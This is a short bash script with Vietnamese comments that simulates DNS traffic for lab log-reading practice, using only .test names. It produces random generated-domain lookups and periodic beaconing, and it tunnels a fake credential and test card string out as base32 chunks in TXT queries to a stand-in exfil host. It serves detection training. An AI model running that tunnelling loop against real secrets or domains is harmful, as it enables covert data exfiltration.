#!/bin/bash
# dns-la.sh — GIẢ LẬP ba kiểu DNS đáng ngờ để tập đọc log (chỉ trong lab: mọi tên đều dưới .test — router trả lời tại chỗ, không ra Internet).
# 1) DGA: 25 tên ngẫu nhiên   2) "đường hầm" DNS: dữ liệu mã hoá base32 nhét vào nhãn TXT   3) gọi về đều đặn mỗi 15 giây, 8 lần
for i in $(seq 1 25); do dig +short +tries=1 +time=1 "$(tr -dc a-z0-9 </dev/urandom | head -c 14).test" >/dev/null; done
printf '%s' "tai-khoan=an;mat-khau=LabGia-123;the=4111111111111111" | base32 -w0 | tr -d = | tr A-Z a-z | fold -w 50 | nl -w1 -s' ' |
  while read -r so manh; do dig +short +tries=1 +time=1 TXT "$manh.$so.t.exfil-lab.test" >/dev/null; done
for i in $(seq 1 8); do dig +short +tries=1 +time=1 update.cdn-lab.test >/dev/null; sleep 15; done
